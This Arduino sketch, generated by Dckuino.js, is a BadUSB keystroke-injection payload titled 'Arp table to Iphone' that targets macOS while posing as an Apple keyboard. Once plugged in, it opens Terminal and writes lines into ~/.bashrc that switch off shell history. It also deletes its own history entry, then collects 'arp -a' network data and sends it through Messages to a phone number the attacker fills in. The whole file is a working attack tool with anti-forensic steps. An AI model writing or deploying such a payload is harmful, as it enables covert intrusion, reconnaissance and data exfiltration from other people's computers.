// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script uses the "x=$(arp -a)" command to retrieve ARP table information.
  // Then it sends the information to your iPhone.
  // Shoutout to matthewkayne and 0iphor13 for the Phone code part.
  // Replace "Phone Number HERE" with your phone number to receive MacOs System information
  // Title: Arp table to Iphone
  // Author: NARSTY
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" x=$(arp -a); osascript -e 'tell application \"Messages\" to send \"'\"$x\"'\" to buddy \"Phone Number HERE\"'");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}